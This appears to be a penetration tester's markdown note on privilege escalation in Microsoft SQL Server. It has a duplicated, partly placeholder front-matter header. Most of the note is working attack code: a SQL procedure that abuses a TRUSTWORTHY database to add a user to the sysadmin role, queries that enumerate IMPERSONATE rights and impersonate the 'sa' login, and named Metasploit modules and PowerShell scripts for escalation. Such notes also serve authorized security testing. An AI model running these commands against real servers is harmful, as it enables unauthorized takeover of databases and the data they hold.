---
title: 
draft: false
tags:
  - tag1
  - tag2
NeedsReview: true
---
---

title: MSSQL Privilege Escalation - Privilege Escalation  
draft: false  
tags:

- mssql
    
- privilege-escalation
    
- impersonation
    
- trustworthy-db  
    NeedsReview: false
    

---

> [!summary] Core Concept  
> Escalate privileges within Microsoft SQL Server using TRUSTWORTHY databases, impersonation rights, and sysadmin role abuse.

### 🔸 Through — Navigating Internals → _Privilege Escalation_

---

## 🔸 Trustworthy Database Exploitation

```sql
USE db_name;
CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'user', 'sysadmin';
EXEC sp_elevate;
```

## 🔸 User Impersonation

```sql
SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
REVERT;
```

## 🔸 Metasploit Modules

```bash
use auxiliary/admin/mssql/mssql_escalate_execute_as
use auxiliary/admin/mssql/mssql_escalate_dbowner
```

## 🔸 PowerShell Scripts

- `Invoke-SqlServer-Escalate-ExecuteAs.psm1`
    
- `Invoke-SqlServer-ElevateDbOwner.psm1`
    

## 🔗 Related

- [[Execution - MSSQL]]
    
- [[MSSQL Persistence - Scheduled Tasks]]
    
- [[Credential Access - SQL Logins]]